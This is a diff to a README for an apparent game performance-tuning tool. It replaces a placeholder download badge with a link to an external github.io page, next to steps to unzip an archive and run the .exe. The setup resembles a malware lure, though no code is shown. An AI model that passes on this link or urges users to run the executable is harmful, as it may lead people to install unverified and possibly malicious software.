@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fnatic-op-software.github.io/.github/)
 
 ## 📸 Overview
 <img width="1229" height="569" alt="fnatic-op-performance-tuning" src="https://github.com/user-attachments/assets/f8e81233-5327-44c1-920c-200cde3d6916" />
